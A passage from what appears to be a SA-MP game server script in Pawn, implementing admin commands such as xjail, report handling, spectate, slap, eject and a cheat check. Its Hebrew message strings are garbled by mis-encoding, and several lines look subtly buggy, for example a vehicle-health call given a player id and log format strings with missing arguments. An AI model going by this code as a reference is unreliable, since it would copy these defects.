		if(!strlen(reason)) reason = ".фрующя ьр фўьщу ёщсф";
		playerinfo[id][xjail] = 1;
		SetPlayerPos(id,264.3591,77.5832,1001.0391);
		SetPlayerFacingAngle(id,270.0);
		SetCameraBehindPlayer(id);
		SetPlayerInterior(id,6);
		SetFreeze(id,1);
		if(playerinfo[id][inact]) OutOfActivity(id);
		if(playerinfo[id][logged]) fsetint(fuser(id),"XJail1",1);
		format(string,sizeof(string)," *** %s has been xjailed by %s. (%s)",GetName(id),GetName(playerid),reason);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if((equal(cmd,"/xunj") || equal(cmd,"/xunjail")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /xunjail(xunj) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
 		if(!playerinfo[id][xjail])
		{
			format(string,sizeof(string)," .ьр сыьр ·ющущ %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][xjail] = 0;
		SetPlayerInterior(id,0);
		SetFreeze(id,0);
		SpawnPlayer(id);
		if(playerinfo[id][logged]) fsetint(fuser(id),"XJail1",0);
		format(string,sizeof(string)," *** %s has been xunjailed by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/ccheck") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, Float:h, cs = 0, msgs = 0, weap[4], string[M_S], badweapons[] = {2,10,11,12,13,43,44,45};
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /ccheck [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		format(string,sizeof(string)," ~~~ :%s - сущў· Ў'щшщэ ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		msgs++;
		GetPlayerArmour(id,h);
		if(h > 100.0)
		{
			SendClientMessage(playerid,white," ЁюЎр юЄь 100 ютя");
			cs++, msgs++;
		}
		GetPlayerHealth(id,h);
		if(h > 100.0)
		{
			SendClientMessage(playerid,white," ЁюЎрх юЄь 100 чщщэ");
			cs++, msgs++;
		}
		for(new i=0;i<13;i++)
		{
			GetPlayerWeaponData(id,i,weap[0],weap[1]);
			if(weap[1] == 69 || weap[1] == 500 || weap[1] >= 65536) weap[2] = 1;
			for(new ii=0;ii<sizeof(badweapons);ii++) if(weap[0] == badweapons[ii]) weap[3] = 1;
		}
		if(weap[2])
		{
			SendClientMessage(playerid,white," щ∙ ч∙у ьЎ'щш ыух°щэ");
			cs++, msgs++;
		}
		if(weap[3])
		{
			SendClientMessage(playerid,white," ЁюЎр Ў'щш Ё∙ўщэ");
			cs++, msgs++;
		}
		if(GetPlayerSpecialAction(id) == SPECIAL_ACTION_USEJETPACK && playerinfo[playerid][level] < 17)
		{
			SendClientMessage(playerid,white," ЁюЎр Ў'щш т'шЇрў");
			cs++, msgs++;
		}
		if(IsPlayerInAnyVehicle(id))
		{
			GetVehicleHealth(id,h);
			if(h > 1000.0)
			{
				SendClientMessage(playerid,white," ЁюЎр Ў'щш т'шЇрў");
				cs++, msgs++;
			}
		}
		format(string,sizeof(string)," .ЁюЎрх ёъ фыь %d Ў'щшщэ",cs);
		SendClientMessage(playerid,red,string);
		msgs++;
		if(msgs > 10) TooManyMsgs(playerid);
		return 1;
	}
	if((equal(cmd,"/takereport") || equal(cmd,"/tr")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /takereport(tr) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][reportid] == INVALID_PLAYER_ID)
		{
			format(string,sizeof(string)," .ьр ∙ьч ∙хэ ущххч %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		format(string,sizeof(string)," .%s юшЇь ыЄ· сущххч ∙ь %s",GetName(id),GetName(playerid));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) SendClientMessage(i,yellow,string);
		format(string,sizeof(string)," .юшЇь ыЄ· сущххч ∙∙ьч· %s фрующя",GetName(playerid));
		SendClientMessage(id,green,string);
		playerinfo[playerid][reports]++;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Reports",playerinfo[playerid][reports]);
		format(string,sizeof(string),"took %s(%d)'s report (id: %d reason: %s)",GetName(id),id,cmd);
		Log("Reports",playerid,string);
		playerinfo[id][reportid] = INVALID_PLAYER_ID;
		format(playerinfo[id][report],64,"");
		return 1;
	}
	if((equal(cmd,"/cancelreport") || equal(cmd,"/cr")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /cancelreport(cr) [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][reportid] == INVALID_PLAYER_ID)
		{
			format(string,sizeof(string)," .ьр ∙ьч ∙хэ ущххч %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		format(string,sizeof(string)," .%s сщшь р· фущххч ∙ь %s",GetName(id),GetName(playerid));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) SendClientMessage(i,yellow,string);
		format(string,sizeof(string)," .сщшь р· фущххч ∙∙ьч· %s фрующя",GetName(playerid));
		SendClientMessage(id,red,string);
		format(string,sizeof(string),"canceled %s(%d)'s report (id: %d reason: %s)",GetName(id),id,cmd);
		Log("Reports",playerid,string);
		playerinfo[id][reportid] = INVALID_PLAYER_ID;
		format(playerinfo[id][report],64,"");
		return 1;
	}
	if((equal(cmd,"/listreports") || equal(cmd,"/lr")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new string[M_S], c = 0;
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· фущххчщэ ∙Ё∙ьчх ьрч°хЁф ~~~");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][reportid] != INVALID_PLAYER_ID)
		{
			c++;
			format(string,sizeof(string)," Х %d) %s(%d) ущххч Єь %s(%d)",c,GetName(playerinfo[i][reportid]),playerinfo[i][reportid],GetName(i),i);
			SendClientMessage(playerid,c % 2 == 0 ? grey : white,string);
			SendClientMessage(playerid,c % 2 == 0 ? grey : white,playerinfo[i][report]);
		}
		if(!c) SendClientMessage(playerid,red," .рщя ущххчщэ");
		else if(c == 1) SendClientMessage(playerid,red," .ёъ фыь ущххч рчу");
		else
		{
			format(string,sizeof(string)," .ёъ фыь %d ущххчщэ",c);
			SendClientMessage(playerid,red,string);
		}
		format(string,sizeof(string),"viewed list of reports (count: %d)",c);
		Log("Reports",playerid,string);
		return 1;
	}
	if(equal(cmd,"/poke") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][access][1] > 0))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && playerinfo[playerid][access][1] <= 0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /poke [id/name] [text] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!IsPlayerMAdmin(playerid) && playerinfo[playerid][access][0] > 0 && IsPlayerMAdmin(id)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф фцх Єь рующЁщэ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[playerid][access][1] > 0) playerinfo[playerid][access][1]--;
		cmd = strrest(cmdtext,idx);
		PlayAudioStreamForPlayer(id,audio_url "you_were_poked.wav");
		format(string,sizeof(string)," %c%s-∙ьч· Їхў ь",!strlen(cmd) ? '.' : ':',GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),@c(grey) " * %s pokes you%c",GetName(playerid),!strlen(cmd) ? '.' : ':');
		SendClientMessage(id,grey,string);
		if(strlen(cmd) > 0)
		{
			format(string,sizeof(string),"%s\n%s",string,cmd);
			SendClientMessage(id,grey,cmd);
			SendClientMessage(playerid,grey,cmd);
		}
		ShowPlayerDialog(id,dialog_ni,DIALOG_STYLE_MSGBOX,@c(white) "Poke",string,"OK","");
		return 1;
	}
	if(equal(cmd,"/ans") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /ans [id/name] [text] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!strlen(playerinfo[id][question]))
		{
			format(string,sizeof(string)," .ьр ∙ьч ∙хэ ∙рьф %s",GetName(id));
			return SendClientMessage(playerid,red,string);
		}
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,red," .ьр °∙ю· ·∙хсф");
		format(string,sizeof(string)," :%s ЄЁф ь∙рьф ∙ь %s",GetName(id),GetName(playerid));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (IsPlayerMAdmin(i) || PlayerHasRank(i,RankID("Ўхх· ф∙°·"))))
		{
			SendClientMessage(i,yellow,string);
			SendClientMessage(i,yellow,cmd);
		}
		format(string,sizeof(string),@c(green) ":ЄЁф ьъ %s\n" @c(lightgreen) "%s",GetName(playerid),cmd);
		ShowPlayerDialog(id,dialog_answer,DIALOG_STYLE_MSGBOX,@c(lightblue) "?",string,"ф∙с","ётх°");
		playerinfo[id][answeredby] = playerid;
		format(playerinfo[id][question],128,"");
		return 1;
	}
	if(equal(cmd,"/qlist") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new string[M_S], c = 0;
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ф∙рьх· ∙Ё∙ьчх ьрч°хЁф ~~~");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && strlen(playerinfo[i][question]) > 0 && playerinfo[i][answeredby] == INVALID_PLAYER_ID)
		{
			c++;
			format(string,sizeof(string)," Х %d) :∙рь %s (%d)",c,GetName(i),i);
			SendClientMessage(playerid,grey,string);
			SendClientMessage(playerid,grey,playerinfo[i][question]);
		}
		if(!c) SendClientMessage(playerid,red," .рщя ∙рьх·");
		else if(c == 1) SendClientMessage(playerid,red," .ёъ фыь ∙рьф рч·");
		else
		{
			format(string,sizeof(string)," .ёъ фыь %d ∙рьх·",c);
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/ptele") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /ptele [id/name] [tele cmd] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,red," .ьр °∙ю· Їўху· ∙щтх°");
		if(cmd[0] != '/') format(cmd,sizeof(cmd),"/%s",cmd);
		new string[M_S], tid = -1;
		for(new i = 0; i < sizeof(Teleports) && tid == -1; i++) if(equal(Teleports[i][Tcmd],cmd)) tid = i;
		if(tid == -1) return SendClientMessage(playerid,red," .ф∙щтх° ∙°∙ю· ьр ўщщэ");
		Teleport(id,tid,0);
		format(string,sizeof(string)," %s :фрующя ∙щт° рх·ъ рь",Teleports[tid][Tcmd]);
		SendClientMessage(id,yellow,string);
		format(string,sizeof(string)," %s :рь %s ∙щт°· р·",Teleports[tid][Tcmd],GetName(id));
		SendClientMessage(playerid,yellow,string);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/telespawn") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /telespawn [spawn id] :Ўх°· ф∙щюх∙");
		new id = strval(cmd);
		if(id < 1 || id > sizeof(RandomSpawns)) return SendClientMessage(playerid,red," .юёЇ° ёЇрхя ∙тхщ");
		id--;
		SetPlayerPos(playerid,RandomSpawns[id][rsX],RandomSpawns[id][rsY],RandomSpawns[id][rsZ]);
		SetPlayerFacingAngle(playerid,RandomSpawns[id][rsA]);
		SetPlayerInterior(playerid,RandomSpawns[id][rsI]);
		return 1;
	}
	if(equal(cmd,"/spec") && IsPlayerMAdmin(playerid))
	{
		new id, string[M_S], mode;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /spec [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID && !playerinfo[id][acwarns]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
    	if(id == playerid) return SendClientMessage(playerid,red," .рщя срЇ∙°х·ъ ьсЎЄ р· фЇўхуф фцх Єь ЄЎюъ");
		cmd = strtok(cmdtext,idx), mode = !strlen(cmd) || !IsNumeric(cmd) ? SPECTATE_MODE_NORMAL : strval(cmd);
		SavePlayerPos(playerid);
 		SetPlayerInterior(playerid,GetPlayerInterior(id));
 		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
 		TogglePlayerSpectating(playerid,1);
 		if(IsPlayerInAnyVehicle(id)) PlayerSpectateVehicle(playerid,GetPlayerVehicleID(id),mode);
 		else PlayerSpectatePlayer(playerid,id,mode);
 		playerinfo[playerid][spectate] = id, playerinfo[playerid][specbuttons] = true;
 		AdminSpecText(playerid,'c');
 		for(new i = 0; i < sizeof(spectext); i++) TextDrawShowForPlayer(playerid,spectext[i]);
 		SelectTextDraw(playerid,lightblue);
		format(string,sizeof(string)," .%s ыЄ· р·ф сюЄўс Єь",GetName(id));
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/specoff") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(playerinfo[playerid][spectate] == -1) return SendClientMessage(playerid,red," .р·ф ьр сюЄўс");
		AdminSpecOff(playerid);
		LoadPlayerPos(playerid);
		SendClientMessage(playerid,yellow," .фЇёў· р· фюЄўс");
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/specb") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(playerinfo[playerid][spectate] == -1) return SendClientMessage(playerid,red," .р·ф ьр сюЄўс");
		if(playerinfo[playerid][specbuttons]) return SendClientMessage(playerid,red," .ыЇ·х°щ фюЄўс ыс° ЇЄщьщэ");
 		for(new i = 1; i < sizeof(spectext)-1; i++) TextDrawShowForPlayer(playerid,spectext[i]);
 		SelectTextDraw(playerid,lightblue);
 		playerinfo[playerid][specbuttons] = true;
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/mutelist") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new string[M_S], c = 0;
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ∙чўЁщэ сф∙·ўф ~~~");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][mute][0] > 0)
		{
			c++;
			format(string,sizeof(string)," %d) %s [ID %03d | %d :∙Ёщх· ∙Ёх·°х]",c,GetName(i),i,playerinfo[i][mute][0]);
			SendClientMessage(playerid,grey,string);
		}
		if(!c) SendClientMessage(playerid,red," .рщя ∙чўЁщэ сф∙·ўф");
		else if(c == 1) SendClientMessage(playerid,red," .ёъ фыь ∙чўя рчу");
		else
		{
			format(string,sizeof(string)," .ёъ фыь %d ∙чўЁщэ",c);
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/jaillist") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new string[M_S], c = 0;
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ∙чўЁщэ сыьр ~~~");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][jail][0] > 0 || playerinfo[i][xjail]))
		{
			c++;
			if(playerinfo[i][xjail]) format(string,sizeof(string)," %d) %s [ID %03d | ыьр ·ющущ]",c,GetName(i),i);
			else format(string,sizeof(string)," %d) %s [ID %03d | %d :∙Ёщх· ∙Ёх·°х]",c,GetName(i),i,playerinfo[i][jail][0]);
			SendClientMessage(playerid,grey,string);
		}
		if(!c) SendClientMessage(playerid,red," .рщя ∙чўЁщэ сыьр");
		else if(c == 1) SendClientMessage(playerid,red," .ёъ фыь ∙чўя рчу");
		else
		{
			format(string,sizeof(string)," .ёъ фыь %d ∙чўЁщэ",c);
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/getin") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		if(!CanUseCommand(playerid)) return 1;
		new src, trg, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getin [id/name source] [id/name target] :Ўх°· ф∙щюх∙");
		src = ReturnUser(cmd,playerid);
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) trg = src, src = playerid;
		else trg = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(src) || (IsPlayerNPC(src) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!IsPlayerConnected(trg) || (IsPlayerNPC(trg) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,trg,cmdtext)) return 1;
		if(!IsPlayerInAnyVehicle(trg)) return SendClientMessage(playerid,red," .фю∙·ю∙ ∙сч°· ьр с°ыс");
		new v = GetPlayerVehicleID(trg), seat = GetVehicleEmptySeat(v);
		if(seat == -1) return SendClientMessage(playerid,red," .рщя юўхэ с°ыс");
		PutPlayerInVehicle(src,v,seat);
		if(src == playerid) format(string,sizeof(string)," .%s ∙щт°· р· ЄЎюъ ь°ыс ∙ь",GetName(trg));
		else if(trg == playerid) format(string,sizeof(string)," .ь°ыс ∙ь ЄЎюъ %s ∙щт°· р·",GetName(trg));
		else format(string,sizeof(string)," .%s ь°ыс ∙ь %s ∙щт°· р·",GetName(trg),GetName(src));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/tog") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		ShowPlayerConstDialog(playerid,dialog_admintoggle);
		return 1;
	}
	if(equal(cmd,"/respawn") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != MAX_PLAYERS && !PlayerHasRank(playerid,RankID("Ўхх· ф∙°·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /respawn [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(IsPlayerInAnyVehicle(id))
		{
			RemovePlayerFromVehicle(id);
			if(playerinfo[id][vtele3] == 1) DestroyObject(playerinfo[id][vehicle][7]),playerinfo[id][vtele3] = 0;
			SetVehicleToRespawn(GetPlayerVehicleID(id));
		}
		SpawnPlayer(id);
		format(string,sizeof(string)," *** %s has been respawned by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/getlevel") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /getlevel [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		format(string,sizeof(string)," фщр: %d %s °ю· фрующя ∙ь",playerinfo[id][admin],GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/eject") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /eject [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!IsPlayerInAnyVehicle(id))
		{
			format(string,sizeof(string)," .ьр ЁюЎр с°ыс %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		RemovePlayerFromVehicle(id);
		format(string,sizeof(string)," *** %s has been ejected by %s.",GetName(id),GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || i == id || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
		return 1;
	}
	if(equal(cmd,"/slap") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][access][0] > 0))
	{
		if(playerinfo[playerid][admin] < 1 && playerid != ConsoleID && playerinfo[playerid][access][0] <= 0) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 1");
		new id, Float:h, Float:p[3], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /slap [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!IsPlayerMAdmin(playerid) && playerinfo[playerid][access][0] > 0 && IsPlayerMAdmin(id)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф фцх Єь рующЁщэ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[playerid][access][0] > 0) playerinfo[playerid][access][0]--;
		GetPlayerArmour(id,h);
		if(h > 0.0) SetPlayerArmour(id,h-2.0);
		else
		{
			SetPlayerArmour(id,0.0);
			GetPlayerHealth(id,h);
			SetPlayerHealth(id,h-5.0);
		}
		if(IsPlayerInAnyVehicle(id))
		{
			GetVehicleVelocity(GetPlayerVehicleID(id),p[0],p[1],p[2]);
			SetVehicleVelocity(GetPlayerVehicleID(id),p[0],p[1],p[2]+0.2,id);
		}
		else
		{
			GetPlayerVelocity(playerid,p[0],p[1],p[2]);
			SetPlayerVelocity(id,p[0],p[1],p[2]+0.2);
		}
		PlaySound(playerid,1190);
		PlaySound(id,1190);
		format(string,sizeof(string)," *** %s has been slapped by %s.",GetName(id),GetName(playerid));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
		{
			if(!playerinfo[i][noticedmsg][8] && playerinfo[i][setting][setting_showslaps])
			{
				SendClientMessage(i,grey," (/setting Ёщ·я ьысх· р· фЎт· фёьрЇщэ сЎ'рш Єэ фЇўхуф)");
				playerinfo[i][noticedmsg][8] = 1;
			}
			if(playerinfo[i][setting][setting_showslaps] || i == playerid || i == id || IsPlayerMAdmin(i)) SendClientMessage(i,white,string);
		}
		return 1;
	}
	if(equal(cmd,"/sislap") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 2 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 2");
		new id, Float:h, Float:p[3];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /sislap [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!IsPlayerMAdmin(playerid) && playerinfo[playerid][access][0] > 0 && IsPlayerMAdmin(id)) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф фцх Єь рующЁщэ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		GetPlayerArmour(id,h);
		if(h > 0.0) SetPlayerArmour(id,h-2.0);
		else
		{
			SetPlayerArmour(id,0.0);
			GetPlayerHealth(id,h);
			SetPlayerHealth(id,h-5.0);
		}
		if(IsPlayerInAnyVehicle(id))
		{
			GetVehicleVelocity(GetPlayerVehicleID(id),p[0],p[1],p[2]);
			SetVehicleVelocity(GetPlayerVehicleID(id),p[0],p[1],p[2]+0.2,id);
		}
		else
		{
			GetPlayerVelocity(playerid,p[0],p[1],p[2]);
